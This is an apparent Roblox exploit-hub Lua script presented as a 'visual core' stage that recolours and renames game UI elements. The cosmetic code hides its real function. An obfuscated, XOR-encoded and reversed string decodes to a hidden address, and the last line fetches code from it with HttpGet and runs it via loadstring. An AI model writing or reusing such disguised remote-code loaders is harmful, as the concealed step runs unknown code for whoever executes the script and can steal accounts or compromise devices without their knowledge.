
--[[ STAGE 2: VISUAL CORE ]]
local _UYp_9ixRSkeM_60Qw1nDt="\186\172\165\233\154\165\154\153\168\172\130\080\172\084\084\069\078\074\172\094\181\141\183\177\186\125\072\077\102\091\112\107\098\100\106\016\112\098\082\102\024\023\110\001\026\097\016\024\001\025\030\051\016\114\051\012\010\052\120\059\057\048\040\034\056\032\047\061\108\039\212\209\042\212\210\216\210\221\192\193\004\196\200\194\015\247\243\200\249\245\248\242\227\244\228\232\251\236\225\147\234\234\211\158\234\153\216\222\203\134\129\139\137\131"local pXYbnhaGKgk3v=82 local N5YgREgQKHdSn9AB8bIpJy=119 local sDMfX_j1cPCN5srxuf5w=1 local MiR9Ic6wG54YMkaL=2 local tLrzwUbExnqT=14 local TZmHQuVCnZwTDb6LzL=true local NUdF69P0PA1a5w_4K=bit32 and bit32.bxor if not NUdF69P0PA1a5w_4K then NUdF69P0PA1a5w_4K=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local HgMG8F2XH5aXYZlS={}for pXJf3UbPRtieJOe=1,#_UYp_9ixRSkeM_60Qw1nDt do local kg7W0Phr9_bSqRxvSeTLtv=string.byte(_UYp_9ixRSkeM_60Qw1nDt,pXJf3UbPRtieJOe)local EwcjSQ0Yt0xUvxWYlX72f=(N5YgREgQKHdSn9AB8bIpJy+(pXJf3UbPRtieJOe*MiR9Ic6wG54YMkaL)+tLrzwUbExnqT)%256 if sDMfX_j1cPCN5srxuf5w==0 then kg7W0Phr9_bSqRxvSeTLtv=(kg7W0Phr9_bSqRxvSeTLtv-EwcjSQ0Yt0xUvxWYlX72f)%256 HgMG8F2XH5aXYZlS[pXJf3UbPRtieJOe]=string.char(NUdF69P0PA1a5w_4K(kg7W0Phr9_bSqRxvSeTLtv,pXYbnhaGKgk3v))else kg7W0Phr9_bSqRxvSeTLtv=NUdF69P0PA1a5w_4K(kg7W0Phr9_bSqRxvSeTLtv,pXYbnhaGKgk3v)HgMG8F2XH5aXYZlS[pXJf3UbPRtieJOe]=string.char((kg7W0Phr9_bSqRxvSeTLtv-EwcjSQ0Yt0xUvxWYlX72f)%256)end end local wuMnnyzqi7ZXa=table.concat(HgMG8F2XH5aXYZlS)if TZmHQuVCnZwTDb6LzL then wuMnnyzqi7ZXa=string.reverse(wuMnnyzqi7ZXa)end local ctCUzBhKS7fcsqzqvRXM=wuMnnyzqi7ZXa
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ctCUzBhKS7fcsqzqvRXM))()
